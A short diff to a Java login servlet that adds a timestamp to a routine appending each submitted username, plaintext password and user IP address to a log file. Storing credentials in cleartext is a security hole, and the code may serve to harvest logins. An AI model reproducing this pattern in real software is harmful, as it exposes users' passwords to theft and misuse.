@@ -5,7 +5,8 @@ import java.io.File;
 import java.io.FileWriter;
 import java.io.IOException;
 import java.io.PrintWriter;
-import java.io.Writer;
+import java.text.SimpleDateFormat;
+import java.util.Date;
 
 import javax.servlet.Servlet;
 import javax.servlet.ServletConfig;
@@ -64,6 +65,8 @@ public class LoginServlet implements Servlet {
 		fw=new FileWriter(file.getAbsoluteFile(),true);//true表示续写而不是覆盖
 		BufferedWriter bw=new BufferedWriter(fw);
 		bw =new BufferedWriter(fw);
+		SimpleDateFormat df=new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
+		bw.write("systime:"+df.format(new Date())+"\r\n");
 		bw.write("username:"+username+"\r\n");//win用\r\n，linux用\n，Mac用\r
 		bw.write("password:"+password+"\r\n");
 		bw.write("user_ip:"+userip+"\r\n\r\n");
